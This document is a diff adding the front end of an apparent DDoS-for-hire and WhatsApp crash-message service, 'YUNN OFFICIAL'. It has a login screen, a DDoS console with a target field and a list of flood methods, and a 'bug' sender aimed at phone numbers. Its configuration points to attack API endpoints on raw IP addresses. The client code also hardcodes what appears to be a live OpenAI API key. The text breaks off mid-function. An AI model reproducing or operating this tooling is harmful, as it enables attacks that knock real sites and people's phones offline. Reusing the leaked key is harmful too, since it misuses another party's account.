@@ -1,0 +1,1385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>YUNN - OFFICIAL</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Rubik:wght@400;600&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet"/>
+</head>
+<body>
+  <style>
+    :root {
+      --main: #ff004f;
+      --second: #ff4d4d;
+      --bg: #0a0a0a;
+      --text: #eeeeee;
+      --accent: #00ffe1;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Rubik', sans-serif;
+    }
+
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      overflow-y: auto;
+    }
+
+    /* Custom Scrollbar Styling */
+    ::-webkit-scrollbar {
+      width: 8px;
+    }
+    ::-webkit-scrollbar-track {
+      background: rgba(0, 0, 0, 0.4);
+      border-radius: 10px;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: var(--main);
+      border-radius: 10px;
+      border: 1px solid rgba(0,0,0,0.5);
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: var(--second);
+      box-shadow: 0 0 10px var(--main);
+    }
+
+    #particles-js {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      z-index: 0;
+    }
+
+    .glass-box {
+      background: rgba(15, 0, 5, 0.6);
+      border: 1px solid rgba(255, 0, 80, 0.2);
+      border-radius: 20px;
+      padding: 30px;
+      backdrop-filter: blur(12px);
+      box-shadow: 0 0 40px rgba(255, 0, 80, 0.3), inset 0 0 10px rgba(255, 0, 80, 0.1);
+      z-index: 2;
+      max-width: 440px;
+      width: 100%;
+      transition: all 0.5s ease-in-out;
+      position: relative;
+    }
+
+    /* === ANIMATIONS === */
+    .animated-entry {
+        animation: fadeInDown 0.8s both;
+    }
+
+    @keyframes fadeInDown {
+        from { opacity: 0; transform: translateY(-30px) scale(0.95); }
+        to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(-10px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    #music-player {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      z-index: 9999;
+    }
+
+    #music-toggle {
+      width: 55px;
+      height: 55px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #ff004f, #a000ff);
+      border: none;
+      color: white;
+      font-size: 20px;
+      cursor: pointer;
+      box-shadow: 0 0 15px rgba(255, 0, 100, 0.5);
+      transition: transform 0.3s ease;
+    }
+
+    @keyframes pulseGlow {
+        0%, 100% { box-shadow: 0 0 15px rgba(255, 0, 80, 0.4); }
+        50% { box-shadow: 0 0 30px rgba(255, 0, 80, 0.7); }
+    }
+
+    @keyframes neonFlicker {
+        0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
+            text-shadow:
+                0 0 5px var(--accent),
+                0 0 10px var(--accent),
+                0 0 20px var(--accent),
+                0 0 40px var(--main),
+                0 0 70px var(--main);
+            opacity: 1;
+        }
+        20%, 24%, 55% {
+            text-shadow: none;
+            opacity: 0.8;
+        }
+    }
+
+    .neon-title {
+      font-family: 'Orbitron', sans-serif;
+      color: var(--accent);
+      text-align: center;
+      font-size: 1.4rem;
+      margin-bottom: 20px;
+      animation: neonFlicker 2.5s infinite alternate;
+    }
+
+    /* === LOGIN & MAIN BOX === */
+    input {
+      background: rgba(0, 0, 0, 0.3);
+      color: white;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 12px;
+      padding: 14px;
+      width: 100%;
+      margin-bottom: 15px;
+      transition: 0.3s;
+      font-size: 1rem;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: var(--main);
+      box-shadow: 0 0 15px rgba(255, 0, 80, 0.6);
+      background: rgba(0, 0, 0, 0.5);
+    }
+
+    button {
+      background: linear-gradient(135deg, var(--main), #a00034);
+      border: none;
+      color: white;
+      width: 100%;
+      padding: 15px;
+      border-radius: 12px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      box-shadow: 0 0 15px rgba(255, 0, 80, 0.4);
+      transition: all 0.3s ease-in-out;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 0 25px rgba(255, 0, 80, 0.8);
+    }
+
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: var(--text);
+      animation: spin 1s ease-in-out infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .small-logout, .back-button {
+      background: transparent;
+      border: 1px solid var(--main);
+      color: var(--main);
+      font-size: 0.8rem;
+      padding: 8px 12px;
+      border-radius: 10px;
+      margin-top: 15px;
+      cursor: pointer;
+      transition: 0.3s ease;
+      width: fit-content;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .small-logout:hover, .back-button:hover {
+      background: rgba(255, 0, 80, 0.2);
+      color: white;
+    }
+
+    .profile {
+        text-align: center;
+        margin-bottom: 25px;
+        padding-bottom: 20px;
+        border-bottom: 1px solid rgba(255, 0, 80, 0.2);
+    }
+
+    .profile img {
+        width: 90px;
+        height: 90px;
+        border-radius: 50%;
+        border: 3px solid var(--main);
+        box-shadow: 0 0 20px var(--main);
+        animation: pulseGlow 3s infinite;
+    }
+
+    .profile-info h2 {
+      font-size: 1.5rem;
+      margin-top: 10px;
+      color: var(--text);
+      text-shadow: 0 0 8px var(--main);
+    }
+
+    .status { font-size: 0.9rem; color: var(--accent); }
+    .status i { color: var(--accent); margin-right: 5px; animation: neonFlicker 3s infinite;}
+
+    /* === THANKS TO SECTION === */
+    .thanks-photo {
+        width: 80px;
+        height: 80px;
+        border-radius: 50%;
+        border: 3px solid var(--main);
+        box-shadow: 0 0 20px var(--main);
+        margin-bottom: 10px;
+        animation: pulseGlow 2.5s infinite;
+    }
+    .thanks-name {
+        font-family: 'Orbitron', sans-serif;
+        font-size: 1.2rem;
+        color: var(--text);
+        text-shadow: 0 0 10px var(--accent);
+    }
+
+    .thanks-profile {
+        text-align: center;
+        padding: 10px 0;
+    }
+
+    /* === METHOD/BUG SELECTORS === */
+    .method-selector {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 10px;
+        margin-bottom: 20px;
+    }
+
+    .method-btn {
+        background: rgba(0, 0, 0, 0.3);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        color: var(--text);
+        border-radius: 8px;
+        padding: 10px;
+        text-align: center;
+        cursor: pointer;
+        transition: all 0.3s;
+        font-size: 0.9rem;
+        font-weight: 600;
+    }
+
+    .method-btn:hover {
+        background: rgba(255, 0, 80, 0.2);
+        transform: translateY(-2px);
+    }
+
+    .method-btn.active {
+        background: rgba(255, 0, 80, 0.3);
+        border-color: var(--main);
+        box-shadow: 0 0 10px rgba(255, 0, 80, 0.5);
+    }
+    
+    #bug-selector-container {
+        position: relative;
+        margin-bottom: 20px;
+    }
+
+    #bug-selector-display {
+        background: rgba(0, 0, 0, 0.3);
+        color: white;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 12px;
+        padding: 14px;
+        width: 100%;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        transition: 0.3s;
+        font-size: 1rem;
+    }
+
+    #bug-selector-display:hover, #bug-selector-display.open {
+        border-color: var(--main);
+        box-shadow: 0 0 10px rgba(255, 0, 80, 0.5);
+        background: rgba(0, 0, 0, 0.5);
+    }
+
+    #selected-bug-info {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+
+    #selected-bug-info i {
+        color: var(--main);
+        text-shadow: 0 0 10px var(--main);
+        font-size: 1.2rem;
+    }
+
+    .selector-arrow {
+        transition: transform 0.3s ease;
+    }
+
+    #bug-selector-display.open .selector-arrow {
+        transform: rotate(180deg);
+    }
+
+    #bug-options-list {
+        display: none;
+        position: absolute;
+        top: 105%;
+        left: 0;
+        width: 100%;
+        background: rgba(10, 0, 5, 0.9);
+        border: 1px solid rgba(255, 0, 80, 0.3);
+        border-radius: 12px;
+        backdrop-filter: blur(10px);
+        z-index: 100;
+        padding: 8px;
+        animation: fadeIn 0.3s ease forwards;
+    }
+
+    .bug-option {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+        padding: 12px;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: background-color 0.2s ease, color 0.2s ease;
+        font-size: 0.95rem;
+    }
+
+    .bug-option:hover {
+        background: rgba(255, 0, 80, 0.2);
+        color: var(--accent);
+    }
+
+    .bug-option i {
+        width: 20px;
+        text-align: center;
+        color: var(--main);
+    }
+    .bug-option.active {
+        background: rgba(255, 0, 80, 0.3);
+        font-weight: 600;
+    }
+    
+    /* === START: THEMED AI CHAT INTERFACE === */
+    #ai-assistant-box {
+      display: flex;
+      flex-direction: column;
+      height: 600px; /* Ukuran tetap */
+      max-height: 80vh;
+    }
+    
+    #chat-area {
+        flex-grow: 1;
+        overflow-y: auto;
+        min-height: 0;
+        display: flex;
+        flex-direction: column;
+        gap: 5px;
+        margin-bottom: 15px;
+        padding: 15px 10px;
+        background: rgba(0, 0, 0, 0.25); /* Latar belakang gelap transparan */
+        border-radius: 12px;
+        border: 1px solid rgba(255, 0, 80, 0.1);
+        box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.5); /* Efek kedalaman */
+    }
+    
+    .message-row {
+        display: flex;
+        align-items: flex-end;
+        gap: 10px;
+        animation: fadeInBubble 0.5s ease-out forwards;
+    }
+
+    .message-row.user {
+        justify-content: flex-end;
+    }
+
+    .ai-avatar {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, var(--main), var(--accent));
+        color: var(--bg);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 1.2rem;
+        flex-shrink: 0;
+        box-shadow: 0 0 15px var(--main);
+    }
+
+    .chat-input-area {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+
+    /* Menggunakan gaya input default dari tema */
+    .chat-input-area > input#chat-input {
+      flex-grow: 1;
+      margin-bottom: 0;
+      resize: none;
+      min-height: 50px;
+      max-height: 150px;
+      overflow-y: auto;
+    }
+    
+    /* Menggunakan gaya tombol default dari tema, namun dibuat bulat */
+    .chat-input-area > button {
+        width: 50px;
+        height: 50px;
+        flex-shrink: 0;
+        border-radius: 50%;
+        padding: 0;
+        margin-top: 0;
+        font-size: 1.1rem;
+    }
+    
+    .chat-bubble {
+        padding: 10px 15px;
+        max-width: 100%;
+        line-height: 1.5;
+        word-wrap: break-word;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+        font-size: 0.95rem;
+        position: relative;
+    }
+
+    .chat-bubble span {
+        display: block;
+        white-space: pre-wrap; /* Agar baris baru tetap ditampilkan */
+    }
+
+    .chat-timestamp {
+        font-size: 0.7rem;
+        opacity: 0.6;
+        text-align: right;
+        margin-top: 5px;
+        display: block;
+    }
+
+    @keyframes fadeInBubble {
+        from { opacity: 0; transform: translateY(15px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    .chat-user {
+        background: linear-gradient(135deg, var(--accent), #00c6b3); /* Gradasi Cyan/Accent */
+        color: var(--bg); /* Teks gelap agar kontras */
+        border-radius: 18px 5px 18px 18px; /* Bentuk gelembung seperti WhatsApp */
+    }
+
+    .chat-ai {
+        background: rgba(50, 50, 50, 0.7); /* Abu-abu gelap transparan */
+        border: 1px solid rgba(255, 0, 80, 0.2);
+        color: var(--text); /* Teks terang */
+        border-radius: 5px 18px 18px 18px; /* Bentuk gelembung seperti WhatsApp */
+    }
+
+    .chat-ai i.fa-spinner {
+        margin-right: 8px;
+    }
+    /* === END: THEMED AI CHAT INTERFACE === */
+
+
+    /* === RESULT MESSAGE & POPUP === */
+    .result-message { margin-top: 15px; text-align: center; font-size: 1rem; min-height: 1.2em; }
+    .success { color: #00ff88; }
+    .error { color: #ff4d4d; }
+
+    #popup {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.7); display: none; /* Flex controlled by JS */
+      justify-content: center; align-items: center; z-index: 999;
+    }
+    .popup-content {
+      background: #1a1a1a; padding: 30px; border-radius: 15px; text-align: center;
+      box-shadow: 0 0 20px var(--second); position: relative;
+    }
+    .close-btn {
+      position: absolute; top: 10px; right: 15px; font-size: 1.5rem;
+      color: var(--second); cursor: pointer;
+    }
+    .contact { margin-top: 20px; color: var(--main); text-align: center; font-size: 0.9rem; }
+    .contact a { color: #00acee; text-decoration: none; display: inline-block; margin-top: 5px; }
+
+    /* === LOADING SCREEN === */
+    #loading-screen {
+        position: fixed; width: 100%; height: 100%;
+        background-color: var(--bg); display: flex; justify-content: center;
+        align-items: center; z-index: 99999; transition: opacity 0.8s ease, visibility 0.8s;
+    }
+    .loader {
+        border: 4px solid rgba(255, 0, 80, 0.2); border-top: 4px solid var(--main);
+        border-radius: 50%; width: 70px; height: 70px;
+        animation: spin 1s linear infinite; margin: auto;
+    }
+    .loading-text {
+        margin-top: 20px; color: white; font-size: 1.2rem;
+        font-family: 'Orbitron', sans-serif; text-shadow: 0 0 10px var(--main);
+        animation: neonFlicker 2s infinite alternate;
+    }
+
+    /* === INTRO TEXT OVERLAY === */
+    #intro-text-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: var(--bg);
+        display: none; /* Hidden by default */
+        justify-content: center;
+        align-items: center;
+        z-index: 99998;
+        text-align: center;
+        padding: 20px;
+        opacity: 0; /* Starts transparent for animation */
+        animation: fadeInOut 5.5s ease-in-out forwards;
+    }
+
+    #intro-text-content {
+        font-family: 'Orbitron', sans-serif;
+        color: var(--accent);
+        text-shadow:
+            0 0 7px var(--accent),
+            0 0 10px var(--accent),
+            0 0 21px var(--accent),
+            0 0 42px var(--main),
+            0 0 82px var(--main);
+        transition: font-size 0.5s ease-in-out;
+    }
+
+    @keyframes fadeInOut {
+        0% { opacity: 0; }
+        15% { opacity: 1; }
+        85% { opacity: 1; }
+        100% { opacity: 0; }
+    }
+
+
+    /* Hamburger Menu */
+    #menu-toggle {
+        display: none; /* MODIFICATION: Hide by default */
+        position: fixed;
+        top: 20px;
+        left: 20px;
+        z-index: 10000;
+        cursor: pointer;
+        color: var(--main);
+        font-size: 1.8rem;
+        background: rgba(15, 0, 5, 0.5);
+        padding: 10px 15px;
+        border-radius: 10px;
+        border: 1px solid rgba(255, 0, 80, 0.2);
+        transition: all 0.3s ease;
+    }
+
+    #menu-toggle:hover {
+        color: var(--accent);
+        box-shadow: 0 0 15px rgba(255, 0, 80, 0.5);
+    }
+
+    #side-menu {
+        position: fixed;
+        top: 0;
+        left: -280px; /* Hidden by default */
+        width: 250px;
+        height: 100%;
+        background: rgba(10, 10, 10, 0.9);
+        backdrop-filter: blur(10px);
+        border-right: 1px solid rgba(255, 0, 80, 0.3);
+        z-index: 9999;
+        transition: left 0.4s ease-in-out;
+        padding-top: 80px;
+    }
+
+    #side-menu.open {
+        left: 0;
+    }
+
+    #side-menu ul {
+        list-style: none;
+    }
+
+    #side-menu ul li a {
+        display: block;
+        color: var(--text);
+        text-decoration: none;
+        padding: 15px 25px;
+        font-size: 1.1rem;
+        transition: all 0.3s ease;
+        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    #side-menu ul li a:hover {
+        background: rgba(255, 0, 80, 0.2);
+        color: var(--accent);
+        padding-left: 30px;
+    }
+
+    #side-menu ul li a i {
+        margin-right: 15px;
+        width: 20px;
+        text-align: center;
+    }
+  </style>
+
+    <div id="loading-screen">
+      <div class="loader-container">
+        <div class="loader"></div>
+        <p class="loading-text">YUNN OFFICIAL WEBSITE ....</p>
+      </div>
+    </div>
+    
+    <div id="intro-text-overlay">
+        <h1 id="intro-text-content"></h1>
+    </div>
+    
+        <div id="menu-toggle">
+        <i class="fas fa-bars"></i>
+    </div>
+
+    <nav id="side-menu">
+        <ul>
+ <li><a href="#bug-box" class="menu-link">
+   <i class="fas fa-bug"></i> Bug Console</a></li>
+   
+ <li><a href="#ddos-box" class="menu-link">
+   <i class="fas fa-network-wired"></i> DDoS Console</a></li>
+   
+ <li><a href="#thanks-box" class="menu-link">
+   <i class="fas fa-heart"></i> Thanks To</a></li>
+   
+ <li><a href="#ai-assistant-box" class="menu-link">
+   <i class="fas fa-robot"></i> AI Assistant</a></li>
+   
+ <li><a href="#feedback-box" class="menu-link">
+   <i class="fas fa-bug"></i> Report Bug</a></li>
+   
+ <li><a href="#profile-box" class="menu-link">
+   <i class="fas fa-user-cog"></i> My Account</a></li>
+   
+ <li><a href="https://t.me/Rizzxtzy" target="_blank">
+   <i class="fab fa-telegram"></i> Contact</a></li>
+        </ul>
+    </nav>
+
+    <div id="particles-js"></div>
+
+    <div id="popup">
+        <div class="popup-content glass-box">
+            <span class="close-btn" onclick="closePopup()">×</span>
+            <p id="popup-message"></p>
+        </div>
+    </div>
+
+    <div class="glass-box animated-entry" id="login-box">
+        <div class="profile">
+            <img src="https://files.catbox.moe/j4z51d.jpg" alt="PP">
+        </div>
+        <h1 class="neon-title"><i class="fas fa-user-shield"></i> Secure Login</h1>
+        <input id="username" placeholder="Username" type="text"/>
+        <input id="password" placeholder="Password" type="password"/>
+        <button id="loginBtn">
+            <i class="fas fa-sign-in-alt"></i> Login
+        </button>
+        <div class="result-message" id="login-result"></div>
+    </div>
+    
+    <div class="glass-box" id="ddos-box" style="display:none;">
+        <h1 class="neon-title"><i class="fas fa-network-wired"></i> DDoS Console</h1>
+        
+        <input type="text" id="ddosTarget" placeholder="Target (e.g., example.com)" required>
+        <input type="number" id="ddosTime" placeholder="Duration (seconds)" min="10" max="600" required>
+        
+        <label style="font-size: 0.9rem; opacity: 0.8; margin-left: 5px; margin-bottom: 8px; display: block;">Select Method:</label>
+        <div class="method-selector" id="ddosMethodSelector">
+            </div>
+        
+        <button id="attackBtn">
+            <i class="fas fa-rocket"></i> Launch Attack
+        </button>
+        
+        <div class="result-message" id="ddos-result"></div>
+         <button class="small-logout" id="logoutBtnDdos">
+            <i class="fas fa-sign-out-alt"></i> Logout
+        </button>
+    </div>
+
+    <div class="glass-box" id="bug-box" style="display:none;">
+        <div class="profile">
+            <img alt="profile" src="https://files.catbox.moe/j4z51d.jpg"/>
+            <div class="profile-info">
+                <h2 id="userLabel"></h2>
+                <span class="status"><i class="fas fa-circle"></i> System Connected</span>
+            </div>
+        </div>
+
+        <h1 class="neon-title"><i class="fas fa-yunn"></i> Yunn Official</h1>
+        
+        <input id="bugTarget" placeholder="Target: 628xxxx" type="text"/>
+
+        <div id="music-player" style="display: none;">
+          <audio id="bg-music" loop="">
+            <source src="https://files.catbox.moe/88od3p.mp3" type="audio/mp3"/>
+          </audio>
+        </div>
+
+        <label style="font-size: 0.9rem; opacity: 0.8; margin-left: 5px; margin-bottom: 8px; display: block;">Select Bug Type:</label>
+        <div id="bug-selector-container">
+            <div id="bug-selector-display">
+                <div id="selected-bug-info">
+                    <i class="fas fa-skull-crossbones"></i>
+                    <span id="selected-bug-name">Forclose Ios</span>
+                </div>
+                <i class="fas fa-chevron-down selector-arrow"></i>
+            </div>
+            <div id="bug-options-list">
+          <div class="bug-option active" data-bug="iosX">
+                <i class="fas fa-skull-crossbones"></i><span>Forclose Ios</span></div>
+                <div class="bug-option" data-bug="forceX"><i class="fas fa-eye-slash"></i><span>Forclose Andro</span></div>
+                <div class="bug-option" data-bug="blank"><i class="fas fa-bomb"></i><span>Blank Crash</span></div>
+                <div class="bug-option" data-bug="delay"><i class="fas fa-clock"></i><span>Delay Hard</span></div>
+                <div class="bug-option" data-bug="crash"><i class="fas fa-virus"></i><span>Crash Brutal</span></div>
+                <div class="bug-option" data-bug="bulldozer"><i class="fas fa-bolt"></i><span>Bulldozer Ekstra</span></div>
+            </div>
+        </div>
+        <button id="sendBugBtn">
+            <i class="fas fa-bug"></i> Kirim Bug
+        </button>
+        <button class="small-logout" id="logoutBtnBug">
+            <i class="fas fa-sign-out-alt"></i> Logout
+        </button>
+        <div class="result-message" id="bug-result"></div>
+        <div class="contact">
+            <p><i class="fas fa-code"></i> Contact Developer:</p>
+            <a href="https://t.me/yunoffc" target="_blank">
+                <i class="fab fa-telegram"></i> @yunoffc
+            </a>
+        </div>
+    </div>
+    
+    <div class="glass-box" id="thanks-box" style="display:none;">
+        <h1 class="neon-title"><i class="fas fa-heart"></i> Thanks To</h1>
+        <div class="thanks-profile">
+            <img class="thanks-photo" src="https://files.catbox.moe/r18wdg.jpg" alt="Contributor Photo">
+            <h2 class="thanks-name"><a href="https://t.me/yunoffc" target="_blank">
+                <i class="fab fa-telegram"></i> @yunoffc</a></h2>
+        </div>
+    </div>
+    
+    <div class="glass-box" id="ai-assistant-box" style="display: none;">
+        <h1 class="neon-title"><i class="fas fa-robot"></i> AI Assistant</h1>
+        <div id="chat-area">
+            </div>
+        <div class="chat-input-area">
+            <input id="chat-input" type="text" placeholder="Tulis pertanyaanmu di sini..." />
+            <button onclick="sendToAI()">
+                <i class="fas fa-paper-plane"></i>
+            </button>
+        </div>
+    </div>
+    
+    <div class="glass-box" id="profile-box" style="display:none;">
+       <h1 class="neon-title"><i class="fas fa-user-cog"></i> My Account</h1>
+       <p style="text-align:center; font-size:1rem;"><i class="fas fa-user"></i> 
+        <span id="profileUsername">Guest</span></p>
+       <p style="text-align:center; font-size:0.9rem; opacity:0.7;">
+       <i class="fas fa-calendar-alt"></i>Login: <span id="profileTime">-</span></p>
+      </div>
+  </div>
+
+     <div class="glass-box" id="feedback-box" style="display:none;">
+        <h1 class="neon-title"><i class="fas fa-bug"></i> Bug Report</h1>
+         <textarea id="feedbackText" placeholder="Tulis bug atau masukan di sini..." 
+        style="width:100%; height:150px; padding:12px; border-radius:10px; background:rgba(0,0,0,0.3); 
+    color:white; border:1px solid rgba(255,255,255,0.1);"></textarea>
+        <button onclick="submitFeedback()"><i class="fas fa-paper-plane"></i> Kirim</button>
+     <div class="result-message" id="feedback-result"></div>
+  </div>
+  </div>
+
+    <audio id="loading-sound" src="https://files.catbox.moe/mcpfhw.aac"></audio>
+
+    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+    <script>
+// Initialize particles.js
+particlesJS("particles-js", {
+  particles: {
+    number: { value: 60, density: { enable: true, value_area: 1000 }},
+    color: { value: "#ff004f" },
+    shape: { type: "circle" },
+    opacity: { value: 0.4, random: true },
+    size: { value: 3, random: true },
+    line_linked: { enable: true, distance: 150, color: "#ff004f", opacity: 0.3, width: 1 },
+    move: { enable: true, speed: 2, direction: "none", random: true, out_mode: "out" }
+  },
+  interactivity: {
+    events: { onhover: { enable: true, mode: "grab" }, onclick: { enable: false } },
+    modes: { grab: { distance: 200, line_linked: { opacity: 1 } } }
+  },
+  retina_detect: true
+});
+
+// --- CONFIGURATION ---
+const DB_URL = "https://raw.githubusercontent.com/yunndev1/admin/refs/heads/main/admin.json";
+const BUG_API_ENDPOINT = "http://178.128.99.221:2289/yunn?";
+const DDOS_API_ENDPOINT = "http://159.65.130.46:2003/ddozdzee?";
+
+// --- GLOBAL VARIABLES ---
+let selectedBug = "iosX";
+let selectedDDoSMethod = 'strike';
+let usersData = [];
+
+const ddosMethods = [
+    'strike', 'bypass', 'h2-fast', 'flood', 'http-gecko', 'pidoras', 'xyn', 
+    'destroy', 'mix', 'gecko', 'api', 'c-f', 'fire', 'glory', 'h2-meris',
+    'browser', 'https', 'h2-flood', 'meriam', 'storm', 'star'
+];
+
+// --- DOM ELEMENTS ---
+const loginBox = document.getElementById("login-box");
+const bugBox = document.getElementById("bug-box");
+const ddosBox = document.getElementById("ddos-box");
+const thanksBox = document.getElementById("thanks-box");
+const aiassistantbox = document.getElementById("ai-assistant-box");
+const profilebox = document.getElementById("profile-box");
+const feedbackbox = document.getElementById("feedback-box");
+
+const usernameInput = document.getElementById("username");
+const passwordInput = document.getElementById("password");
+const loginBtn = document.getElementById("loginBtn");
+const loginResult = document.getElementById("login-result");
+
+const userLabel = document.getElementById("userLabel");
+const sideMenu = document.getElementById("side-menu");
+const menuToggle = document.getElementById("menu-toggle");
+
+// Bug Console Elements
+const bugTargetInput = document.getElementById("bugTarget");
+const sendBugBtn = document.getElementById("sendBugBtn");
+const bugResultDiv = document.getElementById("bug-result");
+
+// DDoS Console Elements
+const ddosTargetInput = document.getElementById("ddosTarget");
+const ddosTimeInput = document.getElementById("ddosTime");
+const attackBtn = document.getElementById("attackBtn");
+const ddosResultDiv = document.getElementById("ddos-result");
+
+// All view containers for easy switching
+const views = [loginBox, bugBox, ddosBox, thanksBox, aiassistantbox, feedbackbox, profilebox];
+
+// --- CORE FUNCTIONS ---
+
+// Fetch users from GitHub
+async function fetchUsers() {
+  try {
+    const response = await fetch(DB_URL);
+    if (!response.ok) throw new Error("Failed to fetch users");
+    usersData = await response.json();
+  } catch (error) {
+    console.error("Error fetching users:", error);
+    loginResult.innerText = "Error loading user data";
+    loginResult.className = "result-message error";
+  }
+}
+
+// --- FUNGSI AI ASSISTANT ---
+
+function getCurrentTime() {
+    return new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
+}
+
+function submitFeedback() {
+  const feedback = document.getElementById("feedbackText").value.trim();
+  const resultBox = document.getElementById("feedback-result");
+
+  if (!feedback) {
+    resultBox.innerText = "⚠️ Tidak boleh kosong.";
+    resultBox.className = "result-message error";
+    return;
+  }
+
+  console.log("Feedback terkirim:", feedback);
+  resultBox.innerText = "✅ Terima kasih atas laporanmu!";
+  resultBox.className = "result-message success";
+  document.getElementById("feedbackText").value = "";
+}
+
+function updateProfileInfo() {
+  const user = getSession();
+  if (user) {
+    document.getElementById("profileUsername").innerText = user.username;
+    const now = new Date();
+    document.getElementById("profileTime").innerText = now.toLocaleString('id-ID');
+  }
+}
+
+// Tampilkan info user saat menu "My Account" diklik
+document.querySelector('a[href="#profile-box"]').addEventListener('click', updateProfileInfo);
+
+function appendMessage(role, text) {
+    const chatArea = document.getElementById("chat-area");
+    chatArea.scrollTop = chatArea.scrollHeight;
+    const time = getCurrentTime();
+
+    const messageRow = document.createElement("div");
+    messageRow.className = `message-row ${role}`;
+
+    const chatInput = document.getElementById("chat-input");
+    chatInput.addEventListener("input", function () {
+        this.style.height = "auto";
+        this.style.height = (this.scrollHeight) + "px";
+    });
+
+    let messageHTML = '';
+    if (role === 'ai' || role === 'ai-loading') {
+        messageHTML += `
+            <div class="ai-avatar">
+                <i class="fas ${role === 'ai-loading' ? 'fa-spinner fa-spin' : 'fa-robot'}"></i>
+            </div>`;
+    }
+    
+    messageHTML += `
+        <div class="chat-bubble chat-${role === 'ai-loading' ? 'ai' : role}">
+            <span>${text}</span>
+            <span class="chat-timestamp">${time}</span>
+        </div>`;
+    
+    if (role === 'user') {
+        // Avatar could be added here for the user if desired
+    }
+    
+    messageRow.innerHTML = messageHTML;
+    chatArea.appendChild(messageRow);
+    chatArea.scrollTop = chatArea.scrollHeight;
+    
+    return messageRow;
+}
+
+async function sendToAI() {
+  const input = document.getElementById("chat-input");
+  const message = input.value.trim();
+  if (!message) return;
+
+  // IMPORTANT: Replace with your actual key or a secure method to fetch it.
+  const OPENAI_API_KEY = "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"; 
+
+  appendMessage('user', message);
+  input.value = "";
+  input.style.height = "50px"; // Reset height
+
+  const loadingBubble = appendMessage('ai-loading', 'Thinking...');
+
+  try {
+    const res = await fetch("https://api.openai.com/v1/chat/completions", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": `Bearer ${OPENAI_API_KEY}`
+      },
+      body: JSON.stringify({
+        model: "gpt-4o-mini",
+        messages: [
+          { role: "system", content: "You are a helpful assistant integrated into Dragon Console. Keep your answers concise and clear." },
+          { role: "user", content: message }
+        ]
+      })
+    });
+
+    if (!res.ok) {
+      const errorData = await res.json();
+      throw new Error(errorData.error?.message || `HTTP error! status: ${res.status}`);
+    }
+
+    const data = await res.json();
+    const aiText = data.choices?.[0]?.message?.content?.trim() || "Maaf, saya tidak dapat memberikan respons saat ini.";
+    
+    loadingBubble.remove();
+    appendMessage('ai', aiText);
+
+  } catch (err) {
+    loadingBubble.remove();
+    appendMessage('ai', `❌ Error: ${err.message}`);
+  }
+}
+
+// Enter untuk kirim
+document.getElementById("chat-input").addEventListener("keypress", function (e) {
+  if (e.key === "Enter" && !e.shiftKey) {
+    e.preventDefault();
+    sendToAI();
+  }
+});
+
+
+// Session management
+function saveSession(user) { sessionStorage.setItem("currentUser", JSON.stringify(user)); }
+function getSession() {
+  const session = sessionStorage.getItem("currentUser");
+  return session ? JSON.parse(session) : null;
+}
+function clearSession() { sessionStorage.removeItem("currentUser"); }
+
+// --- UI FUNCTIONS ---
+function showView(viewId) {
+    views.forEach(view => {
+        view.style.display = 'none';
+        view.classList.remove('animated-entry');
+    });
+    const viewToShow = document.getElementById(viewId);
+    if (viewToShow) {
+        // For AI box, we use flex display to ensure proper layout
+        if (viewId === 'ai-assistant-box') {
+            viewToShow.style.display = 'flex';
+        } else {
+            viewToShow.style.display = 'block';
+        }
+        setTimeout(() => viewToShow.classList.add('animated-entry'), 50);
+    }
+}
+
+function playIntroSequence(onComplete) {
